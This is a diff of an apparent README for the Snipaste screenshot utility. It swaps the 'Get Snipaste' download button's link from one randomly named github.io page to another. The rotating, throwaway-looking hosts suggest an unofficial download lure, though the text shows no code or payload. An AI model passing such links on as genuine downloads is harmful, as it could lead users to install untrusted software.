@@ -21,7 +21,7 @@ To begin using this **Snipaste Screenshot Tool** and **Snipaste Image Paster**, 
 | :--- | :--- |
 | **Get Snipaste Screenshot Tool** | Click the button below to start using this **Snipaste Desktop Utility**. |
 
-[![Button](https://img.shields.io/badge/📸-Get_Snipaste-2ea44f?style=for-the-badge)](https://riverfelixsfkb.github.io/.github/snipaste-screenshot-tool)
+[![Button](https://img.shields.io/badge/📸-Get_Snipaste-2ea44f?style=for-the-badge)](https://tannercohenvdwz.github.io/.github/snipaste-screenshot-tool)
 
 ## System Requirements
 
